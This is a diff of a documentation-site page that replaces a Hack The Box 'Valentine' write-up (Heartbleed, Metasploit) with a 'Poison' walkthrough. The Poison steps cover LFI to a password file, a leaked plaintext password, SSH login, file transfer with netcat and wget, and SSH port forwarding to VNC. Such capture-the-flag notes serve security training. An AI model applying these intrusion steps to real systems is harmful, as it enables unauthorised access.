@@ -5,8 +5,8 @@
     
       <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
-<meta name="revised" content="2018-12-22T16:56:06 EST">
-<title>Valentine :: DocDock Documentation</title>
+<meta name="revised" content="2018-12-22T16:56:04 EST">
+<title>Poison :: DocDock Documentation</title>
 <link rel="shortcut icon" href="/images/favicon.png" type="image/x-icon" />
 <link href="/css/font-awesome.min.css" rel="stylesheet">
 <link href="/css/nucleus.css" rel="stylesheet">
@@ -23,7 +23,7 @@
 
     
   </head>
-  <body data-url="/hackthebox/boxes/valentine/">
+  <body data-url="/hackthebox/boxes/poison/">
     
       <header>
   <div class="logo">
@@ -123,13 +123,13 @@
             <i class="fa fa-angle-down fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
       </div>
         <ul>
-    <li data-nav-id="/hackthebox/boxes/poison/" class="dd-item
+    <li data-nav-id="/hackthebox/boxes/poison/" class="dd-item parent active
         ">
       <div>
       <a href="/hackthebox/boxes/poison/">Poison</a><i class="fa fa-circle-thin read-icon"></i>
       </div>
     </li>
-    <li data-nav-id="/hackthebox/boxes/valentine/" class="dd-item parent active
+    <li data-nav-id="/hackthebox/boxes/valentine/" class="dd-item
         ">
       <div>
       <a href="/hackthebox/boxes/valentine/">Valentine</a><i class="fa fa-circle-thin read-icon"></i>
@@ -244,13 +244,13 @@
     <option value="/hackthebox/boxes/" >
   - 
    Boxes</option> 
-    <option value="/hackthebox/boxes/poison/" >
+    <option value="/hackthebox/boxes/poison/"  selected>
   -- 
-   Poison</option>
-    <option value="/hackthebox/boxes/valentine/"  selected>
-  -- 
-   Valentine</option> 
+   Poison</option> 
   
+    <option value="/hackthebox/boxes/valentine/" >
+  -- 
+   Valentine</option>
     <option value="/hackthebox/boxes/waldo/" >
   -- 
    Waldo</option>
@@ -283,64 +283,91 @@
       </div>
     
 
-    <h1>Valentine</h1>
+    <h1>Poison</h1>
     
     
     
 
-<p>I lost my original notes. VM corrupted.</p>
+<p><strong>PHASE 1 NMAP</strong></p>
 
-<p>PHASE 1 — NMAP</p>
+<pre><code>nmap -sC -sV -Pn -oA initial_poison 10.10.10.84
+</code></pre>
 
-<p>nmap -sC -sV -Pn -oA initial 10.10.10.79</p>
+<p>port 22 ssh it can be a rabbit-hole.</p>
 
-<p>Didn’t  return anything of significance. https is odd for a hackthebox  challenge. Port 22 could be the initial foothold. Google apache 2.2.22  https vulns nothing crazy pops out.</p>
+<p>port 80 webpage apache 2.4.29 (FreeBSD) PHP/ 5.6.32</p>
 
-<p><img src="https://cdn-images-1.medium.com/max/667/1*ktA4Uly8qZqyY5idaFSzIQ.png" alt="img" /></p>
+<p><img src="https://cdn-images-1.medium.com/max/667/1*v46ma3u9LDBqAInhbZKSbQ.png" alt="img" /></p>
 
-<p>PHASE 2 — GOBUSTER /wpscan</p>
+<p>port 514 hmm</p>
 
-<p>gobuster -u <a href="http://10.10.10.88">http://10.10.10.</a>79 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-mediuml.txt -t 50</p>
+<p><img src="https://cdn-images-1.medium.com/max/667/1*X2USQz46o0T5qvF7HIcHHg.png" alt="img" /></p>
 
-<p><img src="https://cdn-images-1.medium.com/max/667/1*6GxlmGhzKcW9p3dM6IJQmA.png" alt="img" /></p>
+<p><strong>PHASE 2 LFI</strong></p>
 
-<p>return vulnerable to OpenSSL hearbleed</p>
+<p>Manually  inspect the webpage this is kind of tedious. As you’ll have to  investigate the PHP scripts one by one. listfiles.php has an interesting  new piece of information. Go back to the default webpage and enter  PWDBACKUP.TXT.</p>
 
-<p>PHASE 3 Manual investigation of the webpage</p>
+<p><img src="https://cdn-images-1.medium.com/max/667/1*qRarPkHF82YxzuuG6EmMIA.png" alt="img" /></p>
 
-<p><img src="https://cdn-images-1.medium.com/max/667/1*qKs0pc3NjJSekozsOxl5aQ.png" alt="img" /></p>
+<p><img src="https://cdn-images-1.medium.com/max/667/1*C-ctJhYQN6gow6syvyjdHg.png" alt="img" /></p>
 
-<p>The big give away. A heart bleeding, hmm.</p>
+<p><img src="https://cdn-images-1.medium.com/max/667/1*otJ5hs7nLnzzLogkFGh-_w.png" alt="img" /></p>
 
-<p><img src="https://cdn-images-1.medium.com/max/667/1*6q_Tt4SUGxpXiLjP3Hawfg.png" alt="img" /></p>
+<p>next  step you will have to decode this secure password.txt. I’d like to note  that md5(TMOBILE …COUGH), base64 are not encryption algorithms because  it lacks a key. I used Cyberchef to decode the message 13 times. The  interface for Cyberchef made it easy. tool — <a href="https://gchq.github.io/CyberChef/">https://gchq.github.io/CyberChef/</a></p>
 
-<p>BELIEVE THE HYPE. It’s also a hint to the exploit.</p>
+<p><img src="https://cdn-images-1.medium.com/max/667/1*TBfM88VeQ9jq0wOHWdWsqw.png" alt="img" /></p>
 
-<p>PHASE 4</p>
+<p>Charix!2#4%6&amp;8(0</p>
 
-<p>Wpscan returned Heartbleed vulnerability.</p>
+<p><strong>PHASE 3 SSH</strong> :🤣</p>
 
-<p><img src="https://cdn-images-1.medium.com/max/667/1*egW7vA0TIGqAoOhPc0ZScg.png" alt="img" /></p>
+<p>This  time it wasn’t a rabbit hole. Lady luck was on our side as the  developer left those passwords out and about. Have to guess what the  username is. It’s not poison, after a while, I got it right charix is  the username.</p>
 
-<p>You may also run the exploit through Metasploit.</p>
+<pre><code>secret.zip user.txt
+</code></pre>
 
-<p><img src="https://cdn-images-1.medium.com/max/667/1*Rsm41I0bgJ06JiW29nyVsw.png" alt="img" /></p>
+<p>Need  to move secret.zip off of the machine to unzip the file gzip isn’t  available on the machine. YOU WILL NEED TO CHANGE READ PERMISSIONS</p>
 
-<p><img src="https://cdn-images-1.medium.com/max/667/1*GdxEeuJjOXsUWeYEFqX-FA.png" alt="img" /></p>
+<pre><code>python3 -m http.server 8081
+wget http://10.10.10.84:8081/secret.zip
+chmod 400 secret
+</code></pre>
 
-<p><img src="https://cdn-images-1.medium.com/max/667/1*5S7t58K2dVIfIBBB9DMN_g.png" alt="img" /></p>
+<p>python may not always be available on the host.</p>
 
-<p>Buahahahahaha, we have the ssh RSA key. Truly we are master of the universe.</p>
+<pre><code>File transfer for NetCat
+this tool will transfer a file to the other session the &gt; overwrites the file
+your
+nc -l -p 8081 &gt; directory_path
+fromt target
+nc 10.10.14.3 8081 &gt; secret.zip
+</code></pre>
 
-<p><img src="https://cdn-images-1.medium.com/max/667/1*cUKOc1S3P8HDrfSV7RvGjQ.png" alt="img" /></p>
+<p>What  is the point of secret? after banging my head for a while. I decided to  just for the laughs and tried Netstat and see if any services were  running. By George did I. WAIT//// WHAT THIS LOCALHOST, ARG!!!!!!</p>
 
-<p>without Metasploit</p>
+<pre><code>netstat -na |grep -i LISTEN
+</code></pre>
 
-<p>Some crap, the server leaked.</p>
+<p><img src="https://cdn-images-1.medium.com/max/667/1*qFP4wZp9ZB92M1OlKJSs3g.png" alt="img" /></p>
 
-<p>PHASE 6 SSH</p>
+<p>PHASE 4 SSH AGAIN</p>
 
-<p>I wasn’t sure what the username was it took a few tries to figure out its hype :P.</p>
+<p>Yeah, didn’t know this before this box but you can ssh into localhost.</p>
+
+<p>SSH  port forwarding is a neat tool to get access to the Localhost through  an ssh connection. Well, that’s what well be using it for. Source port  would be for example 8080 destination port would 80 if you wanted to  connect to a web server
+It could take 20 seconds for it to connect also nothing really happens. BE PATIENT!!!!!</p>
+
+<p><code>-L  PORT1:IP: PORT2</code> tells ssh that you want it to listen on your host port  PORT1. any traffic that comes to your host PORT1, send it through the  ssh connection, and then from the host, you’re smashed into, send it  from that host to IP:PORT2</p>
+
+<p><strong>concept</strong></p>
+
+<p>the juice. it’s a secret guess</p>
+
+<p>PHASE 5 FINALE</p>
+
+<p>port 5801 is associated with Vncviewer.</p>
+
+<p><img src="https://cdn-images-1.medium.com/max/667/1*m-dKWRTlS77gOo1Ho1nOdg.png" alt="img" /></p>
 
 
 
@@ -348,8 +375,8 @@
     
         <div class="chevrons">
     <div id="navigation">
-<a class="nav nav-prev" href="/hackthebox/boxes/poison/" title="Poison"> <i class="fa fa-chevron-left"></i><label>Poison</label></a>
-    <a class="nav nav-next" href="/hackthebox/boxes/waldo/" title="Waldo" style="margin-right: 0px;"><label>Waldo</label><i class="fa fa-chevron-right"></i></a></div>
+<a class="nav nav-prev" href="/hackthebox/boxes/" title="Boxes"> <i class="fa fa-chevron-left"></i><label>Boxes</label></a>
+    <a class="nav nav-next" href="/hackthebox/boxes/valentine/" title="Valentine" style="margin-right: 0px;"><label>Valentine</label><i class="fa fa-chevron-right"></i></a></div>
   </div>
 
   </section>
@@ -366,7 +393,7 @@
 
     
     <div class="github-link">
-      <a href="https://github.com/vjeantet/hugo-theme-docdock/edit/master/exampleSite/content/HackTheBox/Boxes/valentine/_index.md" target="blank"><i class="fa fa-code-fork"></i>
+      <a href="https://github.com/vjeantet/hugo-theme-docdock/edit/master/exampleSite/content/HackTheBox/Boxes/Poison/_index.md" target="blank"><i class="fa fa-code-fork"></i>
         Improve this page</a>
     </div>
     
